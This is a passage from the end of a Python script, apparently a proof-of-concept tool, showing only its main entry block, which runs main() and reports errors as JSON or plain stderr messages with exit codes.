if __name__ == "__main__":
    json_requested = "--json" in sys.argv[1:]
    try:
        raise SystemExit(main())
    except PocError as error:
        if json_requested:
            print(
                json.dumps(
                    {
                        "status": "fail",
                        "error": str(error),
                        "exit_code": error.exit_code,
                    },
                    sort_keys=True,
                )
            )
        else:
            print(f"FAIL: {error}", file=sys.stderr)
        raise SystemExit(error.exit_code)
    except Exception as error:
        if json_requested:
            print(
                json.dumps(
                    {"status": "fail", "error": str(error), "exit_code": 1},
                    sort_keys=True,
                )
            )
        else:
            print(f"FAIL: {error}", file=sys.stderr)
        raise SystemExit(1)
